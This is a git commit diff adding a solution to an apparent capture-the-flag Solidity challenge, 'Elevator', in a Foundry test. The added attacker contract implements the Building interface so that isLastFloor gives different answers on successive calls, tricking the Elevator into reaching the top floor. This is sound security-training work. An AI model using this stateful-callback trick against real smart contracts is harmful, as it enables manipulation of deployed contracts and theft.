31529d152cfdded4567dd021eccb0554707ecb2e
vesla0x1 <vesla0x1@gmail.com>
2025-02-19 15:35:35 -0300

    feat: add elevator solution

--- test/11_Elevator.t.sol
+++ test/11_Elevator.t.sol
@@ -4,6 +4,27 @@ pragma solidity ^0.8.13;
 import {Test, console} from "forge-std/Test.sol";
 import {Elevator, Building} from "../src/11_Elevator.sol";
 
+contract Skyscraper is Building {
+    Elevator public elevator;
+    bool private top;
+
+    constructor(Elevator _elevator) {
+        elevator = _elevator;
+    }
+    
+    function goToLastFloor() public {
+        elevator.goTo(100);
+    }
+
+    function isLastFloor(uint256) external returns (bool) {
+        if (!top) {
+            top = true;
+            return false;
+        }
+        return true;
+    }
+}
+
 contract TestElevator is Test {
     address public player = address(0xbad);
     Elevator public instance;
@@ -17,6 +38,8 @@ contract TestElevator is Test {
         vm.startPrank(player);
 
         // Your exploit goes here
+        Skyscraper building = new Skyscraper(instance);
+        building.goToLastFloor();
 
         vm.stopPrank();
         assertTrue(instance.top());
